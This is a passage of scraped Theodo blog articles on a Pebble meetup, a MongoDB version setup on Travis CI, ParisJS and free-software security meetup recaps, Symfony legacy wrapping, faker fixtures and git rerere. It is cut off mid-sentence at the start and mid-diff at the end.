information) and apps which allow you to do various kinds of things among which: take a picture, change the music on your phone or check your gps navigation, but I\u2019ll come back to that later. One other piece of information to note: you can only have at most 8 apps or watchfaces loaded on the watch at any given time.\n\nDeveloping on Pebble\u2026\nSo, how do I make my own app? There are several ways to do that, depending on the app you want to make:\nPebble C: Apps running on Pebble are written in C, so if you want to make an app that needs no communication with your phone (such as a watchface or Tiny bird) or if you want to build an optimal app, you can use the Pebble C SDK.\nPebbleKit: If you already have a mobile app that you want to use on your Pebble, then PebbleKit is for you: it allows you to push notifications on the Pebble and exchange data with an app running on the Pebble.\nPebbleKit JS: If you want to build an app on the Pebble and use the features of the phone (without having to launch an app on your phone), then PebbleKit JS is the solution. Build your app using the C SDK and run JavaScript on you phone, thus your app can access the internet, the phone\u2019s GPS, persist data on the phone and so on\u2026\nBut if you are allergic to C, then you may want to check out Pebble.js. It lets you run JavaScript applications on your phone which can access all the resources of the phone as well as communicate with the Pebble. However, as they run only on the phone, the required Bluetooth protocol uses more power and makes the app slower than a native app.\nOne last thing to mention about building Pebble apps: Pebble has made a free cloud platform: CloudPebble which allows you to easily make new apps by using existing templates as well as compile your app. All these features add up to make a really user-friendly development environment!\nLigthning Talks:\nThomas\u2019 talk was followed by four lightning talks which I will describe in a few words:\nIn the first talk, Th\u00ea-Minh TRINH and Antoine Kuhn from Applidium presented their app which allows you to see your public transportation itinerary and go through the connections you have to make. This allows you to see exactly where you have to go without having to find your phone lost in the depths of your pocket. (This app is not available yet).\nThe second described app allows you to see a black and white version of what the phone\u2019s camera is sensing and take pictures.\nThen we were introduced to the Connected Challenge, an online hackathon dedicated to Connected objects in which start-ups and big companies have made their APIs available.\nFinally, a really interesting talk about what you can do when you combine Pebble with Tasker(\u201cTasker is an application for Android which performs tasks (sets of actions) based on\u00a0contexts\u00a0(application, time, date, location, event, gesture) in user-defined profiles or in clickable or timer home screen widgets.\u201d) such as have your public transportation notifications transferred to Pebble only when you are at home and it is earlier than 8am or at the office and later than 6pm.\nWhat\u2019s there to like about Pebble?\nSo it\u2019s been a week since I got my own Pebble and I have found some of its features quite enjoyable such as getting e-mail, agenda and SMS notifications, controlling the music without having to take my phone out of my pocket and having the GPS navigation (with Nav me) on your watch really comes in handy when you\u2019re riding your bicyle and like me you have no sense of direction \u263a.\n\nI don\u2019t find the lack of touchscreen detrimental as I don\u2019t expect my watch to replace my phone and the existing 4 buttons are sufficient for most tasks and this allows the watch to have a way longer battery life, which is nice. However, as one may expect some of the apps you can find are a little buggy at times. Furthermore, being able to use only 8 apps or watchfaces at a time is quite constraining as some of the applications the watch is shipped with (such as the music controller) could use some improvements, which has been done by some apps you can find on the app store.\nConclusion\nAs you may have noticed, I am quite thrilled by my new watch, despite its limitations and I will definitely dive into the possibilities of combining it with Tasker. The meetup was really informative and interesting for Pebble beginners such as myself and more advanced Pebble users can discover use cases they might not have thought of so do not hesitate to come and join us and spend some enjoyable time \u263a.\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tFran\u00e7ois Plesse\r\n  \t\t\t\r\n  \t\t\t\tFran\u00e7ois Plesse is a web developper at Theodo. He's also a geek, into connected objects and fascinated by everything related to machine learning.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\t\nI just had a little problem with my tests on Travis due to a wrong MongoDb version. Travis uses the 2.4.12 version of MongoDb and I needed the 2.6.6 version. The official documentation of travis doesn\u2019t provide a way to change the MongoDb version. Fortunately just before that I needed to specify the version of Elasticsearch and the documentation provided me an easy way to do so:\nbefore_install:\r\n  - wget https://download.elasticsearch.org/elasticsearch/elasticsearch/elasticsearch-1.2.4.deb && sudo dpkg -i --force-confnew elasticsearch-1.2.4.deb\r\n\nI just needed to install manually Elasticsearch. So why not doing the same thing for MongoDb with the help of the MongoDb documentation:\nbefore_script:\r\n  - sudo apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv 7F0CEB10\r\n  - echo 'deb http://downloads-distro.mongodb.org/repo/ubuntu-upstart dist 10gen' | sudo tee /etc/apt/sources.list.d/mongodb.list\r\n  - sudo apt-get update\r\n  - sudo apt-get install -y mongodb-org=2.6.6 mongodb-org-server=2.6.6 mongodb-org-shell=2.6.6 mongodb-org-mongos=2.6.6 mongodb-org-tools=2.6.6\r\n  - sleep 15 #mongo may not be responded directly. See http://docs.travis-ci.com/user/database-setup/#MongoDB\r\n  - mongo --version\r\n\nThis quick hack permits our tests to run correctly.\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tMaxime Thoonsen\r\n  \t\t\t\r\n  \t\t\t\tEducation Hacker. Full Stack developer - Agile and Lean Coach\r\nTwitter: https://twitter.com/maxthoon\r\nGithub: https://github.com/MaximeThoonsen  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tI went to ParisJS meetup at Deezer headquarters last Wednesday with fellow colleagues Aur\u00e9lie and Valentin. There were some awesome talks, so I\u2019d like to give you some lightning advertising about them.\nThe program (in French).\n1st talk: Khalid Jebbari (GitHub, Twitter), meetup organizer, on GSS\nKhalid spent most of his talk gunning down CSS on the basic things you want to accomplish simply but are forced to use dirty hacks (centering, here I come). A few people in the audience felt the need to defend it afterwards  The problem he said is that when you\u2019re thinking of the layout, you\u2019re not thinking in a flow way but in a constraint way: I want to position my element relatively to another one.\nSolution? GSS! Strongly inspired from Apple (still leading in design) Cocoa Autolayout, it uses constraints to compute the best layout possible based on them. DOM items are positionned absolutely and moved to their right place through CSS transformations. The project is not very mature, and the syntax sure feels heavy, but for once the paradigm can really bring back together a lot of front-end developers and layout.\nHis notes (in French): gss-paris-js\n2nd talk: Jean-Loup Karst (Twitter) from breaz.io on statistics on technologies used by French start-ups\nbreaz.io is a company that bring together very passionate developers and French start-ups looking forward to recruiting them. Thanks to their business, they gather a lot of data on this ecosystem, especially on the leading technologies among them. We learnt for example that PHP is still a huge backend technology for start-ups, but not as much as it is for the rest of the world (40% vs. 80%). Some global outsiders really shine in the French start-up world (Python, Node.js, Ruby). For front-end, the observations are equivalent, Angular.js surpasses jQuery, and we\u2019re very happy at Theodo to have developed a lot of applications lately with Angular.js.\nUnfortunately, I felt the statistics lacked some significativity. I would have loved to have more confidence intervals (even just guessed) to draw more accurate conclusions from the graphs.\nRelated post in breaz.io blog: Back stack French tech inventory\n3rd talk: Gabriel Majoulet (Github, Twitter) from Brawker on Bitcoin applications in JavaScript\nGabriel explained (in a very simplified way for us newbies) how Bitcoin and block chain transactions work. The aim of Bitcoin is to build a decentralized monetary system (partly) for security reasons, this goal is really undermined when we use huge platforms like Mt. Gox because they represent a single point of failure. We saw how it went for them. JavaScript has a central role to play in Bitcoin applications: you don\u2019t wont to store and use users clear private keys on your app server anymore. If you don\u2019t know anything then being hacked has no hard consequence. The solution is to store encrypted private keys on the server that the client can request and decrypt with his password and do Bitcoin operations directly from the browser without the server ever seeing a clear private key.\nThe subject is very passioning and security questions arise and really are interesting to discuss. For example, how do you know the JavaScript you\u2019re being served by the website is not a counterfeit? We can use PGP to ensure content is harmless, but not in an automatic way at the present moment.\nHis slides: parisjs-40-deezer-france\nLightning talk: Freddy Harris (GitHub, Twitter) on Hello.js\nFreddy briefly presented Hello.js, a JavaScript library for client-side OAuth authenticating. It is already configured with some major websites (Facebook, Google, Twitter\u2026) and you can add a new one very easily. It supports OAuth 2.0 implicit grant, OAuth 2.0 explicit grant and OAuth 1.0 and OAuth 1.0a.\nHis slides: hello-presentation\nConclusion\nI will definitely keep going to ParisJS meetup and I enjoin all the other Paris front-end (or not) developers to come and share some good time with us!\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tTristan Roussel\r\n  \t\t\t\r\n  \t\t\t\tAfter graduating from l'\u00c9cole Normale Sup\u00e9rieure in mathematics, Tristan explored various jobs: trading, theoretical research in computer science, data analysis and business development. He finally found his way at Theodo in 2013 as a web developer-architect. He works mainly with Symfony and front-end JavaScript frameworks, and is particularly fond of git.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tAt Theodo we have had several projects consisting of adding new features to an existing PHP code using Symfony1, CodeIgniter or homemade frameworks.\nRewriting these applications from scratch would be very costly and dangerous for the businesses. Therefore, we prefer\nembedding the legacy code in a full-stack Symfony2 project.\nBy doing so we can write the new features in a the Symfony application and, if needed, migrate legacy code gradually.\nTheodo Evolution\nThe principle is quite simple:\n\nlet Symfony return a response to the incoming request\nif there is no matching route, delegate the request to the legacy application\nand, if still no matching, return a 404 response\n\nTheodo Evolution is a set of tools combining the practices we have been using for several years to extend legacy applications.\nIn the rest of this article, I will provide a brief introduction to this bundle.\nOverriding the RouterListener\nTheodo Evolution interferes by overriding Symfony\u2019s RouterListener:\nnamespace Theodo\\Evolution\\Bundle\\LegacyWrapperBundle\\DependencyInjection\\Compiler;\r\n\r\nclass ReplaceRouterPass implements CompilerPassInterface\r\n{\r\n\r\n    public function process(ContainerBuilder $container)\r\n    {\r\n        if ($container->hasDefinition('theodo_evolution_legacy_wrapper.router_listener')) {\r\n            $routerListener = $container->getDefinition('router_listener');\r\n\r\n            $definition = $container->getDefinition('theodo_evolution_legacy_wrapper.router_listener');\r\n            $definition->replaceArgument(1, $routerListener);\r\n\r\n            $container->setAlias('router_listener', 'theodo_evolution_legacy_wrapper.router_listener');\r\n        }\r\n    }\r\n}\r\n\nThis custom RouterListener starts by delegating the request handling to Symfony\u2019s RouterListener.\nIf the request does not match any controller, the legacy listener catches the NotFoundHttpException and asks the LegacyKernel to handle it:\nnamespace Theodo\\Evolution\\Bundle\\LegacyWrapperBundle\\EventListener;\r\n\r\nclass RouterListener implements EventSubscriberInterface\r\n{\r\n    public function onKernelRequest(GetResponseEvent $event)\r\n    {\r\n        try {\r\n            $this->routerListener->onKernelRequest($event);\r\n        } catch (NotFoundHttpException $e) {\r\n            if (null !== $this->logger) {\r\n                $this->logger->info('Request handled by the '.$this->legacyKernel->getName().' kernel.');\r\n            }\r\n\r\n            $response = $this->legacyKernel->handle($event->getRequest(), $event->getRequestType(), true);\r\n            if ($response->getStatusCode() !== 404) {\r\n                $event->setResponse($response);\r\n\r\n                return $event;\r\n            }\r\n        }\r\n    }\r\n}\r\n\nLegacyKernel\nSymfony\u2019s Kernel is an implementation of the HttpKernelInterface and therefore has to be able to tell how to transform an incoming Request to a Response object.\nThe same is true for the LegacyKernel. In addition, the LegacyKernel should also know how to autoload the legacy application.\n(For detailed information on autoloading take a look at the autoloading guide)\nIf your are about to wrap a Symfony 1.4 or a CodeIgniter application you are lucky, Theodo Evolution provides you an extension of the abstract LegacyKernel class.\nOtherwise it\u2019s your job to implement the boot and handle functions. Before you start, have a look at the Symfony14Kernel\nand CodeIgniterKernel classes.\nAs I said, the basic idea is quite simple: if Symfony cannot handle the incoming request let your legacy application take care of it.\nHowever, in practice there is lot to do:\nAutoloading, sharing the authentication and the database, managing legacy assets, harmonizing the layout, routing between the two applications, etc.\nMore about these topics soon!\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tKinga Sziliagyi\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tI recently needed to generate random users for a NodeJS project using mongo. I remember the time I used the powerful Alice fixture generator for my Symfony2 projects.\nActually, I didn\u2019t find anything as complete as Alice but I found two very interesting npm modules.\nThe first one is faker. It generates random data such as names, addresses, etc.\nThe second one is pow-mongodb-fixtures. It allows you to record custom data in mongo in a snap.\nWe first need to install these modules. I choose to save them in my dev dependency but it\u2019s totally up to you:\nnpm install faker --save-dev\r\nnpm install pow-mongodb-fixtures --save-dev\r\n\nThen I created a coffee script to be called when I want to load random fixtures. It resets the content of the \u2018myCollectionName\u2019 collection of the \u2018myDbName\u2019 database. Then it enters objects that have two attributes: \u2018lastName\u2019 and \u2018firstName\u2019.\nfixtures = require('pow-mongodb-fixtures').connect 'myDbName'\r\nfaker = require 'faker'\r\n\r\n# Generate random data\r\nusers = []\r\nfor i in [1..10]\r\n  users.push\r\n    lastName: faker.name.lastName()\r\n    firstName: faker.name.firstName()\r\n\r\n# Record these data in the 'myCollectionName' collection\r\nfixtures.clearAndLoad {myCollectionName: users}, (err) ->\r\n  throw err if err\r\n  console.log '10 users have been recorded!'\r\n  fixtures.close ->\r\n    return\r\n\nI can now load fixtures with\ncoffee fixtures-load.coffee\r\n\nThis exemple is very simple but you can generate anything you want with faker : addresses, phone numbers, dates. Check the faker github repository for more infos.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tRapha\u00ebl Dubigny\r\n  \t\t\t\r\n  \t\t\t\tRapha\u00ebl is an agile web developer at Theodo. He uses angular, nodejs and ansible every day.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tI made a talk at one London Symfony2 meetup about how you can easily build up a nice devops environment with Vagrant and Ansible. The slides and the video are available. Feedback is very much appreciated.\nAs we work more and more with Ansible, we have also started a list of our favorites roles we use for our Symfony2 projects.Feel free to suggest yours so we can improve it!\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tMaxime Thoonsen\r\n  \t\t\t\r\n  \t\t\t\tEducation Hacker. Full Stack developer - Agile and Lean Coach\r\nTwitter: https://twitter.com/maxthoon\r\nGithub: https://github.com/MaximeThoonsen  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tThis blog post is in French as the event it relates to is French-only.\nTheodo a rejoint le GTLL (Groupe de Travail Logiciel Libre de Systematic) il y a quelques mois.\nCe p\u00f4le de comp\u00e9titivit\u00e9 rassemble acad\u00e9miques et industriels autour de th\u00e9matiques communes, les logiciels libres dans notre cas.\nC\u2019est l\u2019occasion d\u2019\u00e9changer r\u00e9guli\u00e8rement avec des acteurs du logiciel libre dont les points de vue sont tr\u00e8s compl\u00e9mentaires des n\u00f4tres.\nVoici un bref compte-rendu de la pr\u00e9c\u00e9dente rencontre \u00e0 laquelle nous avons particip\u00e9 autour de la s\u00e9curit\u00e9, sujet particuli\u00e8rement d\u2019actualit\u00e9, l\u2019exemple \u00e9vident du moment \u00e9tant les fuites de films de Sony.\nSi vous voulez en savoir plus, n\u2019h\u00e9sitez pas \u00e0 vous inscrire \u00e0 la newsletter\nLes conf\u00e9rences:\nLouis Granboulan : Logiciel Libre et S\u00e9curit\u00e9\nIl est convaincu que le logiciel libre permet d\u2019obtenir de tr\u00e8s bons r\u00e9sultats en terme de s\u00e9curit\u00e9 du logiciel.\nIl a parl\u00e9 un peu du hardware libre, nous avons demand\u00e9 s\u2019il y avait de gros projets de lanc\u00e9s sur ce sujet en France.\nLa r\u00e9ponse fut n\u00e9gative. Louis explique cela par le fait que la France n\u2019a pas les moyens de le faire \u00e0 son \u00e9chelle : il faudrait le faire au niveau europ\u00e9en.\nLe probl\u00e8me est que les pays europ\u00e9ens ne se font pas assez confiance pour de tels projets.\nJean Goubault-Larrecq : D\u00e9tection d\u2019intrusion avec OrchIDS\nLe net est largement vuln\u00e9rable et il a de plus en plus d\u2019impact dans nos vies. Il nous a pr\u00e9sent\u00e9 un cas d\u2019\u00e9cole avec le ver Slammer qui en 2003 avait fait beaucoup de d\u00e9g\u00e2ts.\nSes sp\u00e9cificit\u00e9s \u00e9taient une propagation rapide (75 000 machines \u00e9tait infect\u00e9es en 30 minutes) et une agressivit\u00e9 toute relative puisqu\u2019il se contentait de se propager al\u00e9atoirement dans le r\u00e9seau.\nCela avait malgr\u00e9 tout suffi \u00e0 augmenter l\u2019activit\u00e9 sur de nombreux serveurs au point de les mettre hors service.\nParmi les cons\u00e9quences on citera qu\u2019internet \u00e9tait tomb\u00e9 au Portugal et en Cor\u00e9e du Sud et une centrale nucl\u00e9aire avait m\u00eame eu son r\u00e9seau informatique interne affect\u00e9 !\nJean nous a montr\u00e9 quelques attaques possibles sur une machine avec au passage un petit \u00e9loge de Kevin Mitnick, un des premiers hackers et d\u2019une explication sur ses premi\u00e8res attaques. Une bonne fa\u00e7on d\u2019apprendre \u00e0 se d\u00e9fendre est d\u2019apprendre \u00e0 attaquer !\nDe nombreux tutoriels pour apprendre \u00e0 p\u00e9n\u00e9trer un syst\u00e8me existent comme avec le site pentesteracademy.\nVient ensuite la pr\u00e9sentation de ORCHIDS.\nLe but est d\u2019essayer de pr\u00e9venir les attaques 0 day en rep\u00e9rant des comportements anormaux.\nComme on ne peut pas savoir comment l\u2019attaque se passera, il faut essayer d\u2019anticiper les comportements de celles-ci afin de d\u00e9tecter des anomalies.\nPar exemple ORCHIDS regarde si les processus ne comportent pas de mont\u00e9es en droit irr\u00e9guli\u00e8res.\nPour cela ORCHIDS analyse l\u2019\u00e9volution autour des uids et gids durant l\u2019excution d\u2019un processus.\nEn utilisant des automates, ils arrivent \u00e0 analyser un tr\u00e8s grand nombre de cas tr\u00e8s rapidement.\nSi d\u00e9tection d\u2019une attaque il y a, alors ORCHIDS peut intervenir.\nUne des r\u00e9ponses possibles est de tuer tous les processus du user concern\u00e9 et de supprimer son compte user ! BAM !\nUn autre type d\u2019attaque peut \u00eatre d\u00e9tect\u00e9 si les logs d\u2019un processus renvoient des erreurs un peu particuli\u00e8res et si en parall\u00e8le il y a un \u00e9cart de l\u2019entropie des processus par rapport aux valeurs statistiquement cr\u00e9dibles.\nLa combinaison de deux \u00e9v\u00e8nements inattendus au m\u00eame instant correspondent souvent \u00e0 une attaque.\nModel checking by Fabrice Kordon\nIl partage le m\u00eame constat qu\u2019internet est de plus en plus critique dans notre vie.\nIl cite en exemple la Domotique, les bourses, le milieu m\u00e9dical ainsi que les futures autoroutes automatiques.\nPour augmenter la s\u00e9curit\u00e9 d\u2019un programme il faut essayer de valider son mod\u00e8le.\nIl doit \u00eatre repr\u00e9sent\u00e9 de mani\u00e8re abstraite, les \u00e9tats \u00e9tant des vecteurs et les transitions des changements d\u2019\u00e9tat.\nIl faut analyser les \u00e9tats potentiellement dangereux de son syst\u00e8me.\nOn parle d\u2019accessibilit\u00e9 d\u2019un \u00e9tat dangereux.\nPar exemple, existe-t-il une execution qui engendre une surchauffe de ma centrale nucl\u00e9aire ?\nLorsque la complexit\u00e9 est trop grande, on peut aussi faire l\u2019analyse via de la logique temporelle : Tout \u00e9tat \u201csurchauffe\u201d est-il toujours suivi par un \u00e9tat \u201calarme\u201d ?\nTout \u00e9tat \u201csurchauffe\u201d engendre apr\u00e8s X unit\u00e9 de temps un \u00e9tat \u201calarme\u201d. Combien vaut X ?\nUne approche quantitative est aussi souhaitable: quelle est la probabilit\u00e9 d\u2019atteindre l\u2019\u00e9tat \u201csurchauffe\u201d ?\nUne fois cette analyse faite, il faut analyser la pr\u00e9sence ou non de garde-fous face \u00e0 ces \u00e9tats dangereux.\nExiste-t-il un contr\u00f4leur qui agit lorsque cet \u00e9tat se r\u00e9alise ?\nPrelude Gilles Lehmann\nLa s\u00e9curit\u00e9 c\u2019est aussi la gestion et la communication des alertes : il existe des formats standard pour la cybers\u00e9curit\u00e9, mais qui ne sont pas encore utilis\u00e9s par tous les outils.\nIDMEF Intrusion detection message exchange format.\nIODEF Incident object definition exchange format.\nCe talk ne portait pas sur la s\u00e9curit\u00e9 \u00e0 proprement parler, mais sur l\u2019\u00e9cosyst\u00e8me de reporting et d\u2019\u00e9changes d\u2019alertes de s\u00e9curit\u00e9, autour des diff\u00e9rents outils SIEM (Security Information Event Management). Plus que de s\u00e9curit\u00e9 \u00e0 proprement parler, il soulevait des questions tr\u00e8s complexes autour de la difficult\u00e9 de faire fonctionner un mod\u00e8le \u00e9conomique open-source viable : Prelude est l\u2019un des outils open-source dans le monde des SIEM.\nOlivier Levillain ANSSI\nCette pr\u00e9sentation portait sur les risques qu\u2019apportent les langages eux-m\u00eames.\nPour Olivier c\u2019est un sujet qui n\u2019est pas assez pris en compte dans les choix techniques d\u2019un projet malgr\u00e9 ses cons\u00e9quences pour la s\u00e9curit\u00e9 et la fiabilit\u00e9 de celui-ci.\nIl nous explique donc qu\u2019un langage peut tromper le d\u00e9veloppeur avec des faux amis et des pi\u00e8ges.\nEn particulier, les langages courants (notamment du web !) ne v\u00e9rifient pas toujours les propri\u00e9t\u00e9s attendues intuitivement pour les op\u00e9rations de base (transitivit\u00e9, r\u00e9flexivit\u00e9, associativit\u00e9).\nExemple en Javascript (un de ses langages \u201cpr\u00e9f\u00e9r\u00e9s\u201d):\n0 == '0' => True\r\n0 == '0.0' => True\r\n'0' == '0.0' => False\r\n\nWTF ?\nOu encore un exemple assez \u00e9norme en Java (il n\u2019y a pas que le PHP qui r\u00e9serve des surprises  )\nb1=1000\r\nb2=1000\r\nb1==b2 => false\r\n\nExplication : \u201c==\u201d compare les objets cr\u00e9\u00e9s, pas leur valeur\na1=42\r\na2=42\r\na1==a2 => true\r\n\nExplication : les \u201cpetits\u201d entiers (-128 \u00e0 127) sont mis en cache pour gagner en performance : a1 et a2 correspondent donc au m\u00eame objet.\nLa r\u00e9flexivit\u00e9 n\u2019est pas toujours non plus respect\u00e9e comme le montre ce tableau (source) :\n\n\nLes chaines de charact\u00e8res comportent aussi pleins de WTFs.\nNotamment PHP qui fait des conversions de ses strings en float si la chaine commence par l\u2019\u00e9quivalent d\u2019une description d\u2019un nombre float.\necho \"5e1+4rftgh\" + \"50\";\r\n\nrenvoie 100 !\nIl nous invite \u00e0 aller nous divertir sur www.thedailywtf.com.\nUn autre exemple d\u2019abus pr\u00e9sent sur les langages : les sp\u00e9cifications ouvertes \u00e0 interpr\u00e9tation.\nPar exemple en Java, un extrait de la sp\u00e9cification de la m\u00e9thode clone :\nThe general intent is that, for any object x, the expression:\r\nx.clone() != x\r\nwill be true, and that the expression:\r\nx.clone().getClass() == x.getClass()\r\nwill be true, but these are not absolute requirements. While it is typically the case that:\r\nx.clone().equals(x)\r\nwill be true, this **is not an absolute requirement**.\r\n\nPas de r\u00e9elles contraintes, ce qui signifie que potentiellement la fonction peut ne pas avoir un comportement d\u00e9terministe ce qui est alors impossible \u00e0 tester.\nMais n\u2019oublions surtout pas sa conclusion: \u201cLe ruby est le pire de tous\u201d. (Ouf..  )\nConclusion\nQue peut-on retenir de tout cela en tant que d\u00e9veloppeurs web ?\nD\u2019abord la diversit\u00e9 de ce que l\u2019on peut entendre par s\u00e9curit\u00e9.\nEn effet chaque projet a ses propres besoins de s\u00e9curit\u00e9.\nIl faut savoir trouver le bon \u00e9quilibre entre s\u00e9curit\u00e9 et fonctionnalit\u00e9s.\nUn projet avec trop de peu de s\u00e9curit\u00e9 menera \u00e0 un d\u00e9sastre.\nUn projet avec trop peu de fonctionnalit\u00e9s ne sera pas utilis\u00e9.\nIl faut donc pouvoir aider le client \u00e0 d\u00e9tecter les points critiques d\u2019un projet afin de les prot\u00e9ger au mieux.\nLa loi de Murphy s\u2019appliquant particuli\u00e8rement bien \u00e0 l\u2019informatique, il faut savoir pr\u00e9voir le pire !\nPour conclure, une liste de bonnes pratiques de s\u00e9curit\u00e9 pour vos projets PHP et un lien vers\nl\u2019Open Web Application Security Project  une association mondiale pour promouvoir la s\u00e9curit\u00e9 des logiciels.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tMaxime Thoonsen\r\n  \t\t\t\r\n  \t\t\t\tEducation Hacker. Full Stack developer - Agile and Lean Coach\r\nTwitter: https://twitter.com/maxthoon\r\nGithub: https://github.com/MaximeThoonsen  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tTL;DR: git hidden gem to remember how to solve conflicts\nHello my dearest git geeks! Do you know about git-rerere? It\u2019s a little thing that saved my life once and I want to explain to you how it can help you too in your workflow.\nFirst, let me explain what is rerere:\nREuse REcorded REsolution\nGosh, I hate git conflicts. They can arise when making a merge commit, but also when applying a stash state or cherry-picking a commit. Sometimes, it\u2019s easy to resolve, and sometimes, well\u2026 it can be a nightmare. Now, imagine you just resolved the hardest conflicts ever and committed a super nice merge commit.\nWhat if some of these conflicts happen again in the future? Scary, right?\nThat\u2019s where git-rerere comes to shine: in this unlikely but unfortunate case, git can reuse your super resolution to automatically avoid the conflict. Sweet! As usual, git has an amazing documentation and even an awesome blog entry for this tool, check it out! Now, let me show you this in action.\nFirst thing first, activate rerere:\ngit config rerere.enabled true\r\n\nYou can pass --global if you want to set it for every project on your machine.\nA code base is worth a thousands words\nI wrote up a little story to explain everything. So here is my shining repository with one awesome lyrics file. Clone it if you want to follow me more easily!\nI have a development branch going strong with some commits:\n* commit 72ea7a30f814ec1552eea1af44631bb67ab97ad8 (origin/rockify-a-lot, rockify-a-lot)\r\n| Author: Tristan Roussel <super@disney.fan>\r\n| Date:   Mon Jan 5 21:49:23 2015 +0100\r\n|\r\n|       Queenify these lyrics!\r\n|\r\n* commit b5f87ebdb50da772c4bea483878775fc0631effd\r\n| Author: Tristan Roussel <super@disney.fan>\r\n| Date:   Mon Jan 5 21:58:37 2015 +0100\r\n|\r\n|     Nickelbackify the lyrics :/\r\n|\r\n* commit a15f60e322646347443548bbc6d017c5ae070d88 (origin/master, master)\r\nAuthor: Tristan Roussel <super@disney.fan>\r\nDate:   Mon Jan 5 21:47:52 2015 +0100\r\n\r\nLet it go\r\n\nMy good friend Frank wants to add a commit to this development branch, and he sent me a Pull Request. Unfortunately, there are conflicts and we\u2019ll have to do this manually.\nSo let\u2019s give it a try with git checkout rockify-a-lot && git merge feature/pink-floydify. Conflicts, indeed. Git being amazing, it takes you by the hand and tells you exactly what to do.\nAuto-merging ice.txt\r\nCONFLICT (content): Merge conflict in ice.txt\r\nRecorded preimage for 'ice.txt'\r\nAutomatic merge failed; fix conflicts and then commit the result.\r\n\nNotice the strange third line. In case you missed it, git status still gives you all the information you need:\nOn branch rockify-a-lot\r\nYou have unmerged paths.\r\n(fix conflicts and run \"git commit\")\r\n\r\nUnmerged paths:\r\n(use \"git add <file>...\" to mark resolution)\r\n\r\nboth modified:   ice.txt\r\n\r\nno changes added to commit (use \"git add\" and/or \"git commit -a\")\r\n\nHere is the result of git diff:\ndiff --cc ice.txt\r\nindex 888de14,606a0d8..0000000\r\n--- a/ice.txt\r\n+++ b/ice.txt\r\n@@@ -1,6 -1,6 +1,10 @@@\r\nThe snow glows white on the mountain tonight\r\nNot a footprint to be seen.\r\n++<<<<<<< HEAD\r\n+The show must go on!\r\n++=======\r\n+ Come on you stranger, you legend, you martyr, and shine!\r\n++>>>>>>> feature/pink-floydify\r\nand it looks like I'm the Queen\r\nCause living with me must have damn near killed you\r\n\nOk, so here\u2019s my resolution, you can check it on branch rockify-everything if you want:\ncommit 5677725c7d9f8fa6c97de4f79ee9d772c8d6af6d\r\nMerge: 72ea7a3 9965c4c\r\nAuthor: Tristan Roussel <super@disney.fan>\r\nDate:   Thu Jan 15 22:47:06 2015 +0100\r\n\r\nMerge remote-tracking branch 'feature/pink-floydify' into rockify-everything\r\n\r\nConflicts:\r\nice.txt\r\n\r\ndiff --cc ice.txt\r\nindex 888de14,606a0d8..2a16731\r\n--- 